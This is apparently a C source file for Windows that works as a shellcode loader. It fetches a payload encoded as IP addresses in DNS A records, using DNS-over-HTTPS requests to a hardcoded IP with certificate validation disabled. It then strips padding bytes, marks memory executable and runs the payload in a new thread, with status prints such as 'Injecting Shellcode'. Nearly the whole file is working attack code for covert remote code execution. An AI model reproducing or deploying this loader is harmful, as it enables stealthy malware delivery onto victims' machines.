#include <ws2tcpip.h>
#include <windows.h>
#include <windns.h>
#include <winhttp.h>
#include <stdio.h>
#include <ip2string.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "dnsapi.lib")
#pragma comment(lib, "ws2_32.lib")

wchar_t* domainArray[] = { L"example.com" };
#define NUM_DOMAINS (sizeof(domainArray) / sizeof(domainArray[0]))

#define MAX_IP_ADDRESSES 256
#define MAX_IP_STRING_LENGTH 16 // "xxx.xxx.xxx.xxx\0"
#define IP_ADDRESSES_STRING_SIZE (MAX_IP_ADDRESSES * (MAX_IP_STRING_LENGTH + 1)) // +1 for a separator or terminator

void PrintHex(const BYTE* buffer, DWORD size) {
    for (DWORD i = 0; i < size; ++i) {
        printf("%02X ", buffer[i]);
    }
    printf("\n");
}

PDNS_RECORD HandleDnsResponse(LPBYTE dnsResponse, DWORD responseSize) {
    if (!dnsResponse || responseSize == 0) {
        printf("Invalid DNS response.\n");
        return NULL;
    }

    // Cast the response to DNS_MESSAGE_BUFFER to access the header.
    DNS_MESSAGE_BUFFER* dnsBuffer = (DNS_MESSAGE_BUFFER*)dnsResponse;
    DNS_BYTE_FLIP_HEADER_COUNTS(&dnsBuffer->MessageHead);

    PDNS_RECORD pDnsRecord = NULL;
    DNS_STATUS status = DnsExtractRecordsFromMessage_W(dnsBuffer, responseSize, &pDnsRecord);

    if (status == NO_ERROR && pDnsRecord != NULL) {
        // Successfully extracted DNS records. Return them for further processing.
        return pDnsRecord;
    }
    else {
        printf("Failed to extract DNS records from message. Status: %d\n", status);
        return NULL; // Return NULL to indicate failure or no records.
    }
}

DWORD ExtractIPv4Addresses(PDNS_RECORD pDnsRecords, IN_ADDR* ipAddresses, DWORD maxAddresses) {
    DWORD count = 0;
    PDNS_RECORD pRecord = pDnsRecords;
    while (pRecord != NULL && count < maxAddresses) {
        if (pRecord->wType == DNS_TYPE_A) {
            ipAddresses[count++] = *(IN_ADDR*)&(pRecord->Data.A.IpAddress);
        }
        pRecord = pRecord->pNext;
    }
    return count; // Return the number of IP addresses extracted
}

static BOOL Base64Encode(const BYTE* data, DWORD dataSize, LPWSTR* encodedString) {
    DWORD encodedStringLength = 0;

    // First, get the required length for the encoded string
    if (!CryptBinaryToStringW(data, dataSize, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &encodedStringLength)) {
        wprintf(L"Failed to calculate the length of the encoded string.\n");
        return FALSE;
    }

    // Allocate memory for the encoded string
    *encodedString = (LPWSTR)LocalAlloc(LMEM_ZEROINIT, encodedStringLength * sizeof(WCHAR));
    if (!*encodedString) {
        wprintf(L"Failed to allocate memory for the encoded string.\n");
        return FALSE;
    }

    // Now, actually encode the data
    if (!CryptBinaryToStringW(data, dataSize, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, *encodedString, &encodedStringLength)) {
        wprintf(L"Failed to encode data.\n");
        LocalFree(*encodedString);
        return FALSE;
    }

    return TRUE;
}

void MakeBase64UrlSafe(LPWSTR base64String) {
    if (!base64String) {
        return;
    }

    for (LPWSTR p = base64String; *p; ++p) {
        switch (*p) {
        case L'+': *p = L'-'; break;
        case L'/': *p = L'_'; break;
        case L'=': *p = L'\0'; return; // Optionally stop at the first '=' padding character
        }
    }

}

LPBYTE makeHttpRequest(LPCWSTR url, LPCWSTR method, LPCWSTR path, LPCWSTR parameters, DWORD* pdwSize) {
    BOOL bResults = FALSE;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    DWORD dwResponseSize = 0; // Keep track of the total size of the response
    LPBYTE pszOutBuffer = NULL; // Initialize to NULL
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;

    // Initialize WinHTTP.
    hSession = WinHttpOpen(L"A WinHTTP Example Program/1.0",
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);

    if (!hSession) {
        wprintf(L"WinHttpOpen failed with error: %lu\n", GetLastError());
        return NULL;
    }

    DWORD dwHttp2Option = WINHTTP_PROTOCOL_FLAG_HTTP2;
    if (!WinHttpSetOption(hSession,
        WINHTTP_OPTION_ENABLE_HTTP_PROTOCOL,
        &dwHttp2Option,
        sizeof(dwHttp2Option))) {
        wprintf(L"Failed to enable HTTP/2, error: %lu\n", GetLastError());
    }

    hConnect = WinHttpConnect(hSession, url,
        INTERNET_DEFAULT_HTTPS_PORT, 0);

    if (!hConnect) {
        wprintf(L"WinHttpConnect failed with error: %lu\n", GetLastError());
        WinHttpCloseHandle(hSession);
        return NULL;
    }

    hRequest = WinHttpOpenRequest(hConnect, method, path,
        NULL, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);

    if (!hRequest) {
        wprintf(L"WinHttpOpenRequest failed with error: %lu\n", GetLastError());
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return NULL;
    }

    DWORD dwSecurityFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
        SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
    if (!WinHttpSetOption(hRequest,
        WINHTTP_OPTION_SECURITY_FLAGS,
        &dwSecurityFlags,
        sizeof(dwSecurityFlags))) {
        wprintf(L"Failed to disable SSL certificate validation, error: %lu\n", GetLastError());
    }

    bResults = WinHttpSendRequest(hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        WINHTTP_NO_REQUEST_DATA, 0,
        0, 0);

    if (bResults) bResults = WinHttpReceiveResponse(hRequest, NULL);

    // Keep reading data until there is nothing left.
    while (bResults) {
        dwSize = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break; // Exit loop on failure

        if (dwSize == 0) break; // Exit loop if no more data is available

        // Allocate or resize the buffer.
        LPBYTE pszTempBuffer = (LPBYTE)realloc(pszOutBuffer, dwResponseSize + dwSize);
        if (!pszTempBuffer) {
            printf("Out of memory\n");
            if (pszOutBuffer) free(pszOutBuffer);
            pszOutBuffer = NULL;
            break;
        }

        pszOutBuffer = pszTempBuffer;

        // Read the data.
        ZeroMemory(pszOutBuffer + dwResponseSize, dwSize);
        if (!WinHttpReadData(hRequest, (LPVOID)(pszOutBuffer + dwResponseSize), dwSize, &dwDownloaded)) break;

        dwResponseSize += dwDownloaded;
    }

    // Set the size of the downloaded data
    if (pdwSize != NULL) {
        *pdwSize = dwResponseSize;
    }

    // Clean up.
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    return pszOutBuffer; // Return the buffer containing the response
}

// Returns a dynamically allocated buffer containing all IP addresses in binary form
LPBYTE ConcatenateIPv4Addresses(IN_ADDR* ipAddresses, DWORD numAddresses, DWORD* totalSize) {
    // Each IPv4 address is 4 bytes
    DWORD bufferSize = numAddresses * sizeof(IN_ADDR);
    LPBYTE buffer = (LPBYTE)malloc(bufferSize);
    if (!buffer) {
        printf("Failed to allocate memory for IP address buffer.\n");
        return NULL;
    }

    LPBYTE currentPos = buffer;
    for (DWORD i = 0; i < numAddresses; ++i) {
        memcpy(currentPos, &ipAddresses[i], sizeof(IN_ADDR));
        currentPos += sizeof(IN_ADDR);
    }

    // Set the total size of the concatenated data
    if (totalSize != NULL) {
        *totalSize = bufferSize;
    }

    return buffer;
}

LPBYTE makeDohQuery(IN LPCWSTR domainName, OUT LPBYTE* concatenatedBuffer, OUT DWORD* concatenatedBufferSize) {
    DWORD bufferSize = 1472; // Desired buffer size
    BYTE* dnsBuffer = (BYTE*)malloc(bufferSize); // Dynamically allocate buffer

    if (!dnsBuffer) {
        printf("Failed to allocate memory for dnsBuffer.\n");
        return 1;
    }
    ZeroMemory(dnsBuffer, bufferSize); // Zero initialize dnsBuffer

    BOOL result = DnsWriteQuestionToBuffer_W((PDNS_MESSAGE_BUFFER)dnsBuffer, &bufferSize, domainName, DNS_TYPE_A, 0, TRUE);
    if (!result) {
        DWORD errorCode = GetLastError();
        if (errorCode == ERROR_INSUFFICIENT_BUFFER) {
            printf("Buffer too small, need at least %lu bytes.\n", bufferSize);
        }
        else if (errorCode == 0) {
            printf("Failed to write DNS question to buffer due to an unspecified error.\n");
        }
        else {
            printf("Failed to write DNS question to buffer. Error Code: %lu\n", errorCode);
        }
    }

    LPWSTR encodedString = NULL;

    if (Base64Encode(dnsBuffer, bufferSize, &encodedString)) {
        MakeBase64UrlSafe(encodedString);
        printf("Encoded DNS query: %S\n", encodedString);
    }
    else {
        wprintf(L"Failed to base64 encode data.\n");
        free(dnsBuffer);
        return NULL;
    }

    // Calculate the length of the final string
    size_t queryPathLength = wcslen(L"/dns-query?dns=") + wcslen(encodedString) + 1; // +1 for null terminator
    LPWSTR queryPathString = (LPWSTR)malloc(queryPathLength * sizeof(WCHAR));
    if (!queryPathString) {
        wprintf(L"Failed to allocate memory for the final string.\n");
        if (encodedString) LocalFree(encodedString);
        free(dnsBuffer);
        return NULL;
    }

    // Construct the final string
    swprintf(queryPathString, queryPathLength, L"/dns-query?dns=%s", encodedString);

    DWORD responseSize = 0;
    LPBYTE dnsResponse = makeHttpRequest(L"3.20.239.165", L"GET", queryPathString, L"", &responseSize);

    if (!dnsResponse) {
        wprintf(L"Failed to get DNS response.\n");
        if (encodedString) LocalFree(encodedString);
        return NULL;
    }

    PDNS_RECORD pDnsRecords = HandleDnsResponse(dnsResponse, responseSize);
    if (pDnsRecords) {
        IN_ADDR ipAddresses[MAX_IP_ADDRESSES];
        DWORD numAddresses = ExtractIPv4Addresses(pDnsRecords, ipAddresses, MAX_IP_ADDRESSES);
        printf("Extracted IP Addresses:\n");
        for (DWORD i = 0; i < numAddresses; i++) {
            unsigned char* bytes = (unsigned char*)&(ipAddresses[i]);
            printf("%u.%u.%u.%u\n", bytes[0], bytes[1], bytes[2], bytes[3]);
        }
        printf("Total IP Addresses Extracted: %lu\n", numAddresses);

        // Use the ConcatenateIPv4Addresses function to get the concatenated buffer
        *concatenatedBuffer = ConcatenateIPv4Addresses(ipAddresses, numAddresses, concatenatedBufferSize);

        // Free the DNS records
        DnsRecordListFree(pDnsRecords, DnsFreeRecordList);
    }
    else {
        printf("No DNS records were extracted or failed to extract DNS records.\n");
    }
}

BOOL dnsDeobsfuscation(IN wchar_t* domainArray[], IN size_t NumberOfElements, OUT PBYTE* ppDAddress, OUT size_t* pDSize) {
    // Initialize variables to keep track of the concatenated DNS responses and their total size.
    *ppDAddress = NULL;
    *pDSize = 0;
    PBYTE dnsResponse = NULL;
    DWORD responseSize = 0;

    for (size_t i = 0; i < NumberOfElements; ++i) {
        LPBYTE concatenatedBuffer = NULL;
        DWORD concatenatedBufferSize = 0;

        // Call makeDohQuery for each domain in the array.
        dnsResponse = makeDohQuery(domainArray[i], &concatenatedBuffer, &concatenatedBufferSize);

        // Check if concatenatedBuffer is valid before proceeding.
        if (concatenatedBuffer && concatenatedBufferSize > 0) {
            // Resize the output buffer to accommodate the new data.
            *ppDAddress = (PBYTE)realloc(*ppDAddress, *pDSize + concatenatedBufferSize);
            if (!*ppDAddress) {
                wprintf(L"Failed to allocate memory for DNS response.\n");
                if (concatenatedBuffer) free(concatenatedBuffer); // Free the concatenated buffer if realloc fails
                return FALSE; // Memory allocation failed.
            }

            // Copy the new data to the output buffer.
            memcpy(*ppDAddress + *pDSize, concatenatedBuffer, concatenatedBufferSize);
            *pDSize += concatenatedBufferSize;

            // Free the concatenated buffer after copying its contents.
            free(concatenatedBuffer);
        }
        else {
            wprintf(L"Failed to get DNS response for %s.\n", domainArray[i]);
            // Decide how to handle individual query failures. For now, continue to the next.
            if (concatenatedBuffer) free(concatenatedBuffer); // Ensure to free the buffer even if it's empty or an error occurred
        }
    }

    return TRUE; // Return TRUE if the function completes, even if some queries failed.
}


// Function to filter out specific bytes (in this case, 0x90) from a buffer
PBYTE FilterOutBytes(PBYTE originalPayload, size_t originalSize, size_t* newSize) {
    // Directly modify the original payload to avoid extra allocation
    size_t j = 0; // Index for the new payload
    for (size_t i = 0; i < originalSize; ++i) {
        if (originalPayload[i] != 0x90) {
            originalPayload[j++] = originalPayload[i];
        }
    }

    *newSize = j; // Update the new size
    // Reallocate to shrink the buffer size, ignore if reallocation fails as it's just an optimization
    PBYTE smallerPayload = (PBYTE)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, originalPayload, j);
    return smallerPayload ? smallerPayload : originalPayload;
}

int main() {

    PBYTE       pDeobfuscatedPayload = NULL;
    size_t      sDeobfuscatedSize = NULL;

    printf("[i] Injecting Shellcode The Local Process Of Pid: %d \n", GetCurrentProcessId());

    printf("[#] Press <Enter> To Decrypt ... ");
    getchar();

    printf("[i] Decrypting ...");
    if (!dnsDeobsfuscation(domainArray, NUM_DOMAINS, &pDeobfuscatedPayload, &sDeobfuscatedSize)) {
        return -1;
    }
    printf("[+] DONE !\n");

    // Improved handling after filtering out bytes
    size_t filteredSize = 0;
    PBYTE filteredPayload = FilterOutBytes(pDeobfuscatedPayload, sDeobfuscatedSize, &filteredSize);
    if (!filteredPayload) {
        printf("[!] Failed to filter payload\n");
        return -1;
    }
    // Free the original payload if it's different from the filtered one
    if (filteredPayload != pDeobfuscatedPayload) {
        HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);
    }
    pDeobfuscatedPayload = filteredPayload;
    sDeobfuscatedSize = filteredSize;

    printf("[i] Deobfuscated Payload At : 0x%p Of Size : %d \n", pDeobfuscatedPayload, sDeobfuscatedSize);

    PrintHex(pDeobfuscatedPayload, sDeobfuscatedSize);

    printf("[#] Press <Enter> To Allocate ... ");
    getchar();
    // Allocating memory the size of sDeobfuscatedSize
    // With memory permissions set to read and write so that we can write the payload later
    PVOID pShellcodeAddress = VirtualAlloc(NULL, sDeobfuscatedSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == NULL) {
        printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
        return -1;
    }


    printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);

    printf("[#] Press <Enter> To Write Payload ... ");
    getchar();

    // Copying the payload to the allocated memory
    memcpy(pShellcodeAddress, pDeobfuscatedPayload, sDeobfuscatedSize);
    // Cleaning the pDeobfuscatedPayload buffer, since it is no longer needed
    memset(pDeobfuscatedPayload, '\0', sDeobfuscatedSize);


    DWORD dwOldProtection = NULL;
    // Setting memory permissions at pShellcodeAddress to be executable
    if (!VirtualProtect(pShellcodeAddress, sDeobfuscatedSize, PAGE_EXECUTE_READ, &dwOldProtection)) {
        printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
        return -1;
    }

    printf("[#] Press <Enter> To Run ... ");
    getchar();

    // Running the shellcode as a new thread's entry 
    if (CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
        printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
        return -1;
    }

    // Freeing pDeobfuscatedPayload
    HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);
    printf("[#] Press <Enter> To Quit ... ");
    getchar();

    return 0;
}